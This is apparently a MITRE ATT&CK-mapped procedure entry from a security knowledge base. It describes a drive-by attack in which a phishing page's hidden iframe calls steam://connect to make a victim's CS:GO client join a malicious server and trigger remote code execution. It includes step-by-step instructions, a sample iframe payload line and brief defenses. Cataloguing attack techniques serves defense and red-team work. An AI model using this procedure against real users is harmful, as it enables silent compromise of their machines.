---
id: proc-csgo-browser-attack
tags:
  - drive-by-compromise
  - steam-protocol
  - browser-exploit
type: procedure
tools:
  - '[[tools/HTML-File-for-Steam-Protocol-Attack]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Windows
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:08.936Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploitation for Client Execution]]'
---
# Launch-Browser-Based-Attack-via-Steam-Protocol

## Summary

This procedure delivers the CS:GO exploit via a malicious website using Steam's browser protocol to automatically connect victims to the attacker's server, launching the client if needed and triggering RCE without user interaction.

## Description

Steam integrates with browsers via protocols like steam://connect/ip:port, allowing iframes in HTML to initiate game connections silently. Host the malicious server, then serve an HTML page with an iframe to the protocol URL. Target: Windows users with Steam/CS:GO installed; prerequisites: Running malicious server from prior steps. Expected outcome: Automated client connection and exploit execution.

## Requirements

1. Hosted malicious CS:GO server (IP/port known).
2. Web server for HTML file (e.g., Apache/nginx).
3. Victim with Steam browser integration enabled.

## Defense

Defensive measures and detection strategies:

- Disable auto-launch for Steam protocols in browser settings.
- Warn users on suspicious site connections to games.
- Block iframe-initiated protocol handlers via CSP.

## Objectives

1. Primary objective: Achieve drive-by initial access.
2. Secondary objective: Launch CS:GO if idle.
3. Expected outcome: Victim connects and RCE triggers.

## Instructions

### Step 1: Host Malicious Server

**Context**: Ensure server ready for connections.

Start srcds with exploit script integrated.

> Configure server.cfg with IP/port. Expected output: Server listening.

### Step 2: Create HTML Payload

**Context**: Embed iframe for protocol invocation.

Set iframe src to steam://connect/attacker_ip:port.

> Edit HTML: <iframe src="steam://connect/192.168.1.100:27015"></iframe>. Expected output: Page with hidden/auto iframe.

### Step 3: Serve and Lure Victim

**Context**: Host page and direct victim via phishing.

Serve HTML on web server; victim visit triggers connection.

> Access page; Steam launches CS:GO and connects. Expected output: Exploit chain activates on client.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/HTML-File-for-Steam-Protocol-Attack]]

## Tags

- [[drive-by-compromise]]
- [[steam-protocol]]
- [[browser-exploit]]
